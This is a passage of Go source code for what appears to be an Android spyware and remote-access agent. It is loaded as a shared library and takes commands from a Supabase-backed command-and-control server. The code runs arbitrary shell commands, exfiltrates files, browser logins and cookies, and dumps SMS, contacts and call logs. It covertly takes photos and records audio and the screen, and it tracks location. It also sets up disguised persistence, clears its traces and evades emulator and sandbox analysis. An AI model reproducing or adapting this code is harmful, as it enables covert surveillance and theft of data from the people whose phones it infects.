		isNum := true
		for _, c := range pid {
			if c < '0' || c > '9' {
				isNum = false
				break
			}
		}
		if !isNum {
			continue
		}
		// Read process name from /proc/<pid>/comm
		comm, err := os.ReadFile("/proc/" + pid + "/comm")
		if err != nil {
			continue
		}
		name := strings.TrimSpace(string(comm))
		// Read state from /proc/<pid>/status
		state := ""
		status, err := os.ReadFile("/proc/" + pid + "/status")
		if err == nil {
			for _, line := range strings.Split(string(status), "\n") {
				if strings.HasPrefix(line, "State:") {
					state = strings.TrimSpace(strings.TrimPrefix(line, "State:"))
					break
				}
			}
		}
		lines = append(lines, fmt.Sprintf("%-8s %-40s %s", pid, name, state))
	}
	return strings.Join(lines, "\n")
}

func showToast(msg string) {
	// Requires a running activity or accessibility service; best-effort via am
	shellExec(fmt.Sprintf("am broadcast -a android.intent.action.SHOW_TOAST --es message '%s' 2>/dev/null", msg))
}

func openURL(url string) {
	shellExec(fmt.Sprintf("am start -a android.intent.action.VIEW -d '%s' 2>/dev/null", url))
}

func vibrateDevice(ms int) {
	if ms <= 0 {
		ms = 500
	}
	shellExec(fmt.Sprintf("cmd vibrator_manager vibrate %d default 2>/dev/null || service call vibrator 2 i64 %d 2>/dev/null", ms, ms))
}

// ============================================================
// PERSISTENCE
// ============================================================

func persist() string {
	results := []string{}

	// Method 1: Copy to a location that survives reboots
	selfPath, err := os.Executable()
	if err != nil {
		selfPath = os.Args[0]
	}

	// Try /data/local/tmp (persists, accessible without root)
	persistDir := "/data/local/tmp/.cache"
	os.MkdirAll(persistDir, 0755)
	destPath := filepath.Join(persistDir, "healthd")

	data, err := os.ReadFile(selfPath)
	if err == nil {
		if err := os.WriteFile(destPath, data, 0755); err == nil {
			results = append(results, "Copied to "+destPath)
		}
	}

	// Method 2: Create init.d script (requires root)
	if isRooted() {
		initScript := fmt.Sprintf("#!/system/bin/sh\n%s &\n", destPath)
		scriptPath := "/system/etc/init.d/99healthd"
		if err := os.WriteFile(scriptPath, []byte(initScript), 0755); err == nil {
			results = append(results, "Created init.d script")
		}
	}

	if len(results) == 0 {
		return "Persistence failed — no writable locations"
	}
	return strings.Join(results, "; ")
}

func unpersist() string {
	results := []string{}
	paths := []string{
		"/data/local/tmp/.cache/healthd",
		"/system/etc/init.d/99healthd",
	}
	for _, p := range paths {
		if err := os.Remove(p); err == nil {
			results = append(results, "Removed "+p)
		}
	}
	if len(results) == 0 {
		return "Nothing to remove"
	}
	return strings.Join(results, "; ")
}

// ============================================================
// FILE EXFILTRATION
// ============================================================

func exfiltrateFiles(c2 *SupabaseC2, root string, extensions []string, maxSizeMB int) string {
	if root == "" {
		root = "/sdcard"
	}
	if maxSizeMB <= 0 {
		maxSizeMB = 5
	}
	maxBytes := int64(maxSizeMB * 1024 * 1024)

	extSet := make(map[string]bool)
	for _, e := range extensions {
		extSet[strings.ToLower(e)] = true
	}

	var count int
	filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() || count >= 50 {
			return nil
		}
		if info.Size() > maxBytes || info.Size() == 0 {
			return nil
		}

		ext := strings.ToLower(filepath.Ext(path))
		if len(extSet) > 0 && !extSet[ext] {
			return nil
		}

		data, err := os.ReadFile(path)
		if err != nil {
			return nil
		}

		c2.UploadFile(filepath.Base(path), data, "exfil")
		count++
		return nil
	})

	return fmt.Sprintf("Exfiltrated %d files from %s", count, root)
}

// ============================================================
// COMMAND HANDLER
// ============================================================

func handleCommand(c2 *SupabaseC2, jm *JobManager, cmd Command) (string, error) {
	switch cmd.Command {

	// --- System ---
	case "sysinfo":
		info := getDeviceInfo()
		c2.SendSystemInfo("android_sysinfo", info)
		data, _ := json.MarshalIndent(info, "", "  ")
		return string(data), nil

	case "isadmin":
		if isRooted() {
			return "Device is rooted (su/magisk available)", nil
		}
		return "Device is NOT rooted", nil

	case "shell":
		var args struct {
			Cmd string `json:"cmd"`
		}
		json.Unmarshal([]byte(cmd.Args), &args)
		if args.Cmd == "" {
			return "No command specified", fmt.Errorf("empty cmd")
		}
		out, err := shellExecTimeout(args.Cmd, 60*time.Second)
		if err != nil {
			return fmt.Sprintf("Error: %v\n%s", err, out), err
		}
		return out, nil

	case "processes":
		return getProcessList(), nil

	case "list":
		var args struct {
			Path string `json:"path"`
		}
		json.Unmarshal([]byte(cmd.Args), &args)
		out, err := listDirectory(args.Path)
		if err != nil {
			return "Failed: " + err.Error(), err
		}
		return out, nil

	// --- Android adaptations of Windows-only commands ---
	// These return sensible responses so the dashboard doesn't show errors

	case "elevate":
		if isRooted() {
			return "Device is already rooted (admin equivalent)", nil
		}
		return "Device is not rooted — cannot elevate on non-rooted Android", nil

	case "excludec", "excludeall":
		return "N/A on Android — no Windows Defender to configure", nil

	case "disableio", "enableio":
		return "N/A on Android — no HID input control available", nil

	case "minimizeall":
		shellExec("input keyevent KEYCODE_HOME 2>/dev/null")
		return "Sent HOME key", nil

	case "darkmode":
		shellExec("cmd uimode night yes 2>/dev/null")
		return "Dark mode enabled (Android 10+)", nil

	case "lightmode":
		shellExec("cmd uimode night no 2>/dev/null")
		return "Light mode enabled (Android 10+)", nil

	case "shortcutbomb":
		// Create multiple shortcut-like notifications
		for i := 0; i < 20; i++ {
			shellExec(fmt.Sprintf("am start -a android.intent.action.VIEW -d 'https://example.com/%d' 2>/dev/null", i))
			time.Sleep(200 * time.Millisecond)
		}
		return "Opened 20 browser tabs", nil

	case "fakeupdate":
		shellExec("am start -a android.intent.action.VIEW -d 'https://google.com' 2>/dev/null")
		return "Opened browser (fake update N/A on Android)", nil

	case "soundspam":
		for i := 0; i < 15; i++ {
			shellExec("cmd media_session volume --set 15 2>/dev/null")
			shellExec("input keyevent KEYCODE_MEDIA_PLAY 2>/dev/null")
			time.Sleep(500 * time.Millisecond)
		}
		return "Sound spam sent", nil

	case "message":
		var args struct {
			Text string `json:"text"`
		}
		json.Unmarshal([]byte(cmd.Args), &args)
		if args.Text == "" {
			args.Text = "Alert"
		}
		// Show notification via am broadcast or toast
		shellExec(fmt.Sprintf("am broadcast -a android.intent.action.SHOW_TOAST --es message '%s' 2>/dev/null", args.Text))
		return "Message shown: " + args.Text, nil

	case "wallpaper":
		var args struct {
			URL string `json:"url"`
		}
		json.Unmarshal([]byte(cmd.Args), &args)
		if args.URL == "" {
			return "No URL specified", fmt.Errorf("empty url")
		}
		return "Wallpaper change requires root or accessibility service on Android", nil

	case "nearbywifi":
		out, _ := shellExec("dumpsys wifi | grep -A2 'ScanResult' | head -50 2>/dev/null")
		if out == "" {
			out = "Nearby WiFi scan not available from app context"
		}
		c2.SendSystemInfo("nearbywifi", out)
		return out, nil

	case "enumeratelan":
		out, _ := shellExecTimeout("ip neigh show 2>/dev/null", 10*time.Second)
		if out == "" {
			// Fallback: read ARP table
			data, _ := os.ReadFile("/proc/net/arp")
			out = string(data)
		}
		if out == "" {
			out = "LAN enumeration not available"
		}
		c2.SendSystemInfo("lan_hosts", out)
		return out, nil

	case "browserdb":
		// Try to grab Chrome/WebView databases
		var results []string
		browserPaths := []string{
			"/data/data/com.android.chrome/app_chrome/Default/History",
			"/data/data/com.android.chrome/app_chrome/Default/Login Data",
			"/data/data/com.android.chrome/app_chrome/Default/Cookies",
			"/data/data/com.android.browser/databases/browser2.db",
		}
		for _, p := range browserPaths {
			data, err := os.ReadFile(p)
			if err == nil && len(data) > 0 {
				c2.UploadFile(filepath.Base(p), data, "browserdb")
				results = append(results, "Uploaded: "+filepath.Base(p))
			}
		}
		if len(results) == 0 {
			return "No browser databases accessible (requires root)", nil
		}
		return strings.Join(results, "\n"), nil

	case "parsebrowser":
		return "Browser parsing not available on Android — use browserdb to grab raw files", nil

	case "webcam":
		// Alias for camera on Android
		data, err := takePhoto()
		if err != nil {
			return "Camera failed: " + err.Error(), err
		}
		err = c2.UploadFile("webcam.jpg", data, "camera")
		if err != nil {
			return "Upload failed: " + err.Error(), err
		}
		return fmt.Sprintf("Photo captured (%d KB)", len(data)/1024), nil

	case "recordscreen":
		tmpPath := filepath.Join(os.TempDir(), "screenrec.mp4")
		defer os.Remove(tmpPath)
		_, err := shellExecTimeout(fmt.Sprintf("screenrecord --time-limit 10 %s 2>/dev/null", tmpPath), 15*time.Second)
		if err != nil {
			return "Screen recording failed: " + err.Error(), err
		}
		data, err := os.ReadFile(tmpPath)
		if err != nil {
			return "Read failed: " + err.Error(), err
		}
		c2.UploadFile("screenrec.mp4", data, "screenrecord")
		return fmt.Sprintf("Screen recorded (%d KB)", len(data)/1024), nil

	case "keycapture", "keylogger":
		// Android doesn't allow keylogging without accessibility service
		return "Keylogging requires Accessibility Service on Android — not available from agent", nil

	// --- Surveillance ---
	case "screenshot":
		data, err := takeScreenshot()
		if err != nil {
			return "Screenshot failed: " + err.Error(), err
		}
		err = c2.UploadFile("screenshot.png", data, "screenshot")
		if err != nil {
			return "Upload failed: " + err.Error(), err
		}
		return fmt.Sprintf("Screenshot captured (%d KB)", len(data)/1024), nil

	case "screenshots":
		var args struct {
			Interval int `json:"interval"`
		}
		json.Unmarshal([]byte(cmd.Args), &args)
		if args.Interval <= 0 {
			args.Interval = 30
		}
		jm.Start("screenshots", func(ctx context.Context) {
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				data, err := takeScreenshot()
				if err == nil {
					c2.UploadFile("screenshot.png", data, "screenshot")
				}
				time.Sleep(time.Duration(args.Interval) * time.Second)
			}
		})
		return fmt.Sprintf("Continuous screenshots started (every %ds)", args.Interval), nil

	case "contacts":
		out, err := getContacts()
		if err != nil {
			return "Failed: " + err.Error(), err
		}
		c2.SendSystemInfo("contacts", out)
		return out, nil

	case "sms_dump":
		out, err := getSMS()
		if err != nil {
			return "Failed: " + err.Error(), err
		}
		c2.SendSystemInfo("sms", out)
		return out, nil

	case "calllog":
		out, err := getCallLog()
		if err != nil {
			return "Failed: " + err.Error(), err
		}
		c2.SendSystemInfo("calllog", out)
		return out, nil

	case "apps":
		out, err := getInstalledApps()
		if err != nil {
			return "Failed: " + err.Error(), err
		}
		c2.SendSystemInfo("installed_apps", out)
		return out, nil

	case "wifi":
		out, err := getWifiInfo()
		if err != nil {
			return "Failed: " + err.Error(), err
		}
		c2.SendSystemInfo("wifi", out)
		return out, nil

	case "location":
		out, err := getLocation()
		if err != nil {
			return "Failed: " + err.Error(), err
		}
		c2.SendSystemInfo("location", out)
		return out, nil

	case "location_track":
		var args struct {
			Interval int `json:"interval"`
		}
		json.Unmarshal([]byte(cmd.Args), &args)
		if args.Interval <= 0 {
			args.Interval = 60
		}
		jm.Start("location_track", func(ctx context.Context) {
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				out, _ := getLocation()
				if out != "" {
					c2.SendKeylog(out, "location_track")
				}
				time.Sleep(time.Duration(args.Interval) * time.Second)
			}
		})
		return fmt.Sprintf("Location tracking started (every %ds)", args.Interval), nil

	case "clipboard":
		out, err := getClipboard()
		if err != nil {
			return "Failed: " + err.Error(), err
		}
		return out, nil

	case "camera":
		data, err := takePhoto()
		if err != nil {
			return "Camera failed: " + err.Error(), err
		}
		err = c2.UploadFile("photo.jpg", data, "camera")
		if err != nil {
			return "Upload failed: " + err.Error(), err
		}
		return fmt.Sprintf("Photo captured (%d KB)", len(data)/1024), nil

	case "microphone":
		var args struct {
			Seconds int `json:"seconds"`
		}
		json.Unmarshal([]byte(cmd.Args), &args)
		if args.Seconds <= 0 {
			args.Seconds = 30
		}
		data, err := recordAudio(args.Seconds)
		if err != nil {
			return "Recording failed: " + err.Error(), err
		}
		err = c2.UploadFile("recording.3gp", data, "audio")
		if err != nil {
			return "Upload failed: " + err.Error(), err
		}
		return fmt.Sprintf("Recorded %ds audio (%d KB)", args.Seconds, len(data)/1024), nil

	// --- Files ---
	case "foldertree":
		var args struct {
			Path  string `json:"path"`
			Depth int    `json:"depth"`
		}
		json.Unmarshal([]byte(cmd.Args), &args)
		out := getFolderTree(args.Path, args.Depth)
		return out, nil

	case "download":
		var args struct {
			Path string `json:"path"`
		}
		json.Unmarshal([]byte(cmd.Args), &args)
		if args.Path == "" {
			return "No path specified", fmt.Errorf("empty path")
		}
		data, err := os.ReadFile(args.Path)
		if err != nil {
			return "Read failed: " + err.Error(), err
		}
		err = c2.UploadFile(filepath.Base(args.Path), data, "download")
		if err != nil {
			return "Upload failed: " + err.Error(), err
		}
		return fmt.Sprintf("Downloaded %s (%d KB)", args.Path, len(data)/1024), nil

	case "upload":
		var args struct {
			Path string `json:"path"`
			Data string `json:"data"` // base64
		}
		json.Unmarshal([]byte(cmd.Args), &args)
		if args.Path == "" || args.Data == "" {
			return "Missing path or data", fmt.Errorf("missing args")
		}
		decoded, err := base64.StdEncoding.DecodeString(args.Data)
		if err != nil {
			return "Base64 decode failed", err
		}
		err = os.WriteFile(args.Path, decoded, 0644)
		if err != nil {
			return "Write failed: " + err.Error(), err
		}
		return fmt.Sprintf("Uploaded %d bytes to %s", len(decoded), args.Path), nil

	case "exfiltrate":
		var args struct {
			Path       string   `json:"path"`
			Extensions []string `json:"extensions"`
			MaxSizeMB  int      `json:"max_size_mb"`
		}
		json.Unmarshal([]byte(cmd.Args), &args)
		result := exfiltrateFiles(c2, args.Path, args.Extensions, args.MaxSizeMB)
		return result, nil

	// --- Control ---
	case "toast":
		var args struct {
			Message string `json:"message"`
		}
		json.Unmarshal([]byte(cmd.Args), &args)
		showToast(args.Message)
		return "Toast shown", nil

	case "openurl":
		var args struct {
			URL string `json:"url"`
		}
		json.Unmarshal([]byte(cmd.Args), &args)
		openURL(args.URL)
		return "Opened " + args.URL, nil

	case "vibrate":
		var args struct {
			Duration int `json:"duration"`
		}
		json.Unmarshal([]byte(cmd.Args), &args)
		vibrateDevice(args.Duration)
		return "Vibrating", nil

	case "persist":
		return persist(), nil

	case "unpersist":
		return unpersist(), nil

	case "cleanup":
		var cleaned []string
		// Clear temp files
		os.RemoveAll(os.TempDir())
		cleaned = append(cleaned, "Cleared temp dir")
		// Clear shell history
		os.Remove(os.Getenv("HOME") + "/.bash_history")
		os.Remove(os.Getenv("HOME") + "/.sh_history")
		cleaned = append(cleaned, "Cleared shell history")
		return strings.Join(cleaned, "; "), nil

	// --- Jobs ---
	case "jobs":
		jobs := jm.List()
		if len(jobs) == 0 {
			return "No active jobs", nil
		}
		return strings.Join(jobs, "\n"), nil

	case "kill":
		var args struct {
			Name string `json:"name"`
			Job  string `json:"job"`
			PID  int    `json:"pid"`
		}
		json.Unmarshal([]byte(cmd.Args), &args)
		// Support both job name and PID
		jobName := args.Name
		if jobName == "" {
			jobName = args.Job
		}
		if jobName != "" {
			if jm.Stop(jobName) {
				return "Stopped job: " + jobName, nil
			}
			return "Job not found: " + jobName, nil
		}
		if args.PID > 0 {
			proc, err := os.FindProcess(args.PID)
			if err != nil {
				return fmt.Sprintf("Process %d not found", args.PID), err
			}
			err = proc.Kill()
			if err != nil {
				return fmt.Sprintf("Failed to kill PID %d: %v", args.PID, err), err
			}
			return fmt.Sprintf("Killed PID %d", args.PID), nil
		}
		return "No job name or PID specified", nil

	case "ping":
		return "pong", nil

	case "sleep":
		var args struct {
			Seconds int `json:"seconds"`
		}
		json.Unmarshal([]byte(cmd.Args), &args)
		if args.Seconds == 0 {
			args.Seconds = 60
		}
		time.Sleep(time.Duration(args.Seconds) * time.Second)
		return fmt.Sprintf("Slept %d seconds", args.Seconds), nil

	case "pausejobs":
		jm.StopAll()
		return "All jobs stopped", nil

	case "resumejobs":
		jm.Start("screenshots", func(ctx context.Context) {
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				data, err := takeScreenshot()
				if err == nil {
					c2.UploadFile("screenshot.png", data, "screenshot")
				}
				time.Sleep(30 * time.Second)
			}
		})
		return "Default jobs resumed (screenshots)", nil

	case "antianalysis":
		var sb strings.Builder
		sb.WriteString("=== Anti-Analysis Report ===\n\n")
		sb.WriteString(fmt.Sprintf("Emulator detected: %v\n", isEmulator()))
		sb.WriteString(fmt.Sprintf("Rooted: %v\n", isRooted()))
		sb.WriteString(fmt.Sprintf("Hardware: %s\n", getProp("ro.hardware")))
		sb.WriteString(fmt.Sprintf("Model: %s\n", getProp("ro.product.model")))
		sb.WriteString(fmt.Sprintf("Device: %s\n", getProp("ro.product.device")))
		sb.WriteString(fmt.Sprintf("QEMU: %s\n", getProp("ro.kernel.qemu")))
		sb.WriteString(fmt.Sprintf("Characteristics: %s\n", getProp("ro.build.characteristics")))
		// Check for analysis tools
		tools := []string{"frida-server", "objection", "drozer", "tcpdump", "strace", "gdb"}
		var found []string
		for _, t := range tools {
			if _, err := exec.LookPath(t); err == nil {
				found = append(found, t)
			}
		}
		if len(found) > 0 {
			sb.WriteString(fmt.Sprintf("Analysis tools found: %s\n", strings.Join(found, ", ")))
		} else {
			sb.WriteString("Analysis tools found: none\n")
		}
		return sb.String(), nil

	case "options", "help":
		return `Available commands (Android agent):
  --- System ---
  ping              - Connection test
  sysinfo           - Full device information
  isadmin           - Check if device is rooted
  shell {cmd}       - Execute shell command
  processes         - List running processes
  list {path}       - List directory contents (JSON)
  foldertree {path} - Directory tree listing
  --- Surveillance ---
  screenshot        - Single screenshot
  screenshots       - Continuous screenshots (job)
  contacts          - Dump contacts
  sms_dump          - Dump SMS messages
  calllog           - Dump call log
  apps              - List installed apps
  wifi              - WiFi info + saved networks
  nearbywifi        - Scan nearby WiFi networks
  location          - Get last known location
  location_track    - Continuous location tracking (job)
  clipboard         - Read clipboard
  camera / webcam   - Take photo
  microphone        - Record audio
  recordscreen      - Record screen (10s)
  --- Files ---
  download {path}   - Download file from device
  upload {path,data}- Upload file to device
  exfiltrate        - Bulk file exfiltration
  browserdb         - Grab browser databases
  --- Network ---
  enumeratelan      - List LAN neighbors
  --- Control ---
  toast {message}   - Show toast message
  message {text}    - Display message
  openurl {url}     - Open URL in browser
  vibrate           - Vibrate device
  minimizeall       - Press HOME key
  darkmode/lightmode- Toggle dark/light mode
  persist           - Install persistence
  unpersist         - Remove persistence
  cleanup           - Clear traces
  --- Jobs ---
  sleep {seconds}   - Sleep N seconds
  antianalysis      - Anti-analysis report
  jobs              - List active jobs
  kill {name/pid}   - Stop a job or kill process
  pausejobs         - Stop all jobs
  resumejobs        - Resume default jobs
  exit              - Kill agent`, nil

	case "exit":
		c2.UpdateCommand(cmd.ID, "complete", "Exiting")
		os.Exit(0)
		return "", nil

	default:
		// Try as raw shell command
		out, err := shellExecTimeout(cmd.Command+" "+cmd.Args, 60*time.Second)
		if err != nil {
			return fmt.Sprintf("Error: %v\n%s", err, out), err
		}
		return out, nil
	}
}

// ============================================================
// ANTI-ANALYSIS
// ============================================================

func isEmulator() bool {
	checks := []struct {
		prop string
		bad  []string
	}{
		{"ro.hardware", []string{"goldfish", "ranchu", "vbox"}},
		{"ro.product.model", []string{"sdk", "emulator", "Android SDK"}},
		{"ro.kernel.qemu", []string{"1"}},
		{"ro.product.device", []string{"generic", "vbox"}},
		{"ro.build.characteristics", []string{"emulator"}},
	}
	for _, c := range checks {
		val := strings.ToLower(getProp(c.prop))
		for _, bad := range c.bad {
			if strings.Contains(val, strings.ToLower(bad)) {
				return true
			}
		}
	}

	// Check for emulator files
	emuFiles := []string{
		"/dev/socket/qemud",
		"/dev/qemu_pipe",
		"/system/lib/libc_malloc_debug_qemu.so",
		"/sys/qemu_trace",
	}
	for _, f := range emuFiles {
		if _, err := os.Stat(f); err == nil {
			return true
		}
	}
	return false
}

// ============================================================
// MAIN
// ============================================================

// main is required but not called in c-shared mode.
func main() {}

// init runs automatically when System.loadLibrary("agent") is called.
// The agent logic runs in a goroutine so it doesn't block the Java caller.
func init() {
	// CRITICAL: Reset Go's signal handlers so they don't conflict with
	// Android's JVM (ART/Dalvik). Go installs handlers for SIGSEGV, SIGBUS,
	// SIGFPE, etc. which crash the JVM process when running as c-shared.
	signal.Reset(syscall.SIGSEGV, syscall.SIGBUS, syscall.SIGFPE,
		syscall.SIGABRT, syscall.SIGTRAP, syscall.SIGPIPE)

	go runAgent()
}

func runAgent() {
	// Recover from any panics to prevent crashing the host JVM process
	defer func() {
		if r := recover(); r != nil {
			// Log panic but don't crash — just restart after delay
			fmt.Fprintf(os.Stderr, "agent recovered from panic: %v\n%s\n", r, debug.Stack())
			time.Sleep(30 * time.Second)
			go runAgent() // restart
		}
	}()

	// Delay startup to avoid sandbox timing analysis
	time.Sleep(time.Duration(3+rand.Intn(5)) * time.Second)

	// Anti-emulator check
	if isEmulator() {
		// Sleep and exit quietly
		time.Sleep(30 * time.Second)
		return
	}

	// Build machine ID
	machineID := getMachineID()

	// Resolve C2 domains
	domains := []string{}
	if c2Domain1 != "" && !strings.HasPrefix(c2Domain1, "PLACEHOLDER") {
		domains = append(domains, c2Domain1)
	}
	if c2Domain2 != "" && !strings.HasPrefix(c2Domain2, "PLACEHOLDER") {
		domains = append(domains, c2Domain2)
	}
	if len(domains) == 0 {
		return
	}

	// Init C2 client
	c2 := NewC2(domains, c2APIKey, machineID)
	jm := NewJobManager()

	// Gather basic info for registration
	info := getDeviceInfo()
	model, _ := info["model"].(string)
	brand, _ := info["brand"].(string)
	manufacturer, _ := info["manufacturer"].(string)
	// Build a meaningful device name from available info
	deviceName := strings.TrimSpace(brand + " " + model)
	if deviceName == "" || deviceName == " " {
		deviceName = strings.TrimSpace(manufacturer + " " + getProp("ro.product.device"))
	}
	if deviceName == "" || deviceName == " " {
		deviceName = "Android Device"
	}
	// whoami often blocked in sandbox; fall back to package-derived user
	user, _ := shellExec("whoami")
	if user == "" {
		user = "app"
	}
	androidVer, _ := info["android_version"].(string)
	sdkVer, _ := info["sdk_version"].(string)
	if androidVer == "" {
		androidVer = "unknown"
	}
	osInfo := fmt.Sprintf("Android %s (SDK %s)", androidVer, sdkVer)
	ip, _ := info["ip"].(string)
	if ip == "" {
		// Fall back to external IP if local IP unavailable (sandbox blocks ip route)
		ip, _ = info["external_ip"].(string)
	}

	// Register
	for i := 0; i < 5; i++ {
		err := c2.Register(deviceName, user, osInfo, ip, isRooted())
		if err == nil {
			break
		}
		time.Sleep(time.Duration(3*(i+1)) * time.Second)
	}

	// Auto-send system info so the dashboard has data immediately
	c2.SendSystemInfo("android_sysinfo", info)

	// Main C2 loop
	beaconInterval := 5 * time.Second
	for {
		// Jitter: ±10%
		jitter := time.Duration(float64(beaconInterval) * (0.9 + rand.Float64()*0.2))
		time.Sleep(jitter)

		// Heartbeat
		c2.Heartbeat()

		// Poll commands
		cmds := c2.PollCommands()
		for _, cmd := range cmds {
			c2.UpdateCommand(cmd.ID, "executing", "")
			result, err := handleCommand(c2, jm, cmd)
			status := "complete"
			if err != nil {
				status = "failed"
			}
			c2.UpdateCommand(cmd.ID, status, result)
		}
	}
}
